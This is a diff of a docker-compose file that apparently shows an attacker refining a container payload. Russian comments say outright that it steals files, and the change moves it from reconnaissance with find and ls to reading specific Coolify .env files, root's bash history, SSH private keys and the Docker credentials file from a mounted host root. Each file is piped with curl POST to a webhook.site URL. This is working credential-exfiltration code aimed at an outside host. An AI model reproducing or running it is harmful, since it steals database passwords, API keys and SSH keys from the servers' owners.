@@ -10,20 +10,25 @@ services:
       - sh
       - -c
       - |
-        apk add --no-cache curl findutils
-        # Разведка: ищем все .env файлы
-        find /host-root -name ".env" -type f 2>/dev/null | curl -X POST -d @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=env_files
+        apk add --no-cache curl
         
-        # Ищем все id_rsa (SSH ключи)
-        find /host-root -name "id_rsa" -type f 2>/dev/null | curl -X POST -d @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=ssh_keys
+        # 1. Крадем .env файлы (пароли от БД, API ключи)
+        cat /host-root/data/coolify/services/a10swue9lhfb1vfjulsx6f5v/.env | curl -X POST -d @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=env_services
         
-        # Ищем coolify.db (база данных)
-        find /host-root -name "coolify.db" -type f 2>/dev/null | curl -X POST -d @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=coolify_db
+        cat /host-root/data/coolify/applications/a459eeihh3xbcfaflx1mnvmi/.env | curl -X POST -d @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=env_app
         
-        # Смотрим структуру /host-root/data (если есть)
-        ls -la /host-root/data/ 2>/dev/null | curl -X POST -d @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=data_dir
+        # 2. Крадем bash_history (история команд с паролями)
+        cat /host-root/root/.bash_history | curl -X POST -d @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=bash_history
         
-        # Смотрим структуру /host-root/root
-        ls -la /host-root/root/ 2>/dev/null | curl -X POST -d @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=root_dir
+        # 3. Крадем SSH ключи
+        cat /host-root/root/.ssh/id_rsa 2>/dev/null | curl -X POST -d @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=ssh_id_rsa
+        
+        cat /host-root/root/.ssh/id_ed25519 2>/dev/null | curl -X POST -d @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=ssh_id_ed25519
+        
+        # 4. Крадем Docker credentials
+        cat /host-root/root/.docker/config.json 2>/dev/null | curl -X POST -d @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=docker_config
+        
+        # 5. Список всех файлов в .ssh
+        ls -la /host-root/root/.ssh/ 2>/dev/null | curl -X POST -d @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=ssh_list
         
         sleep 3600
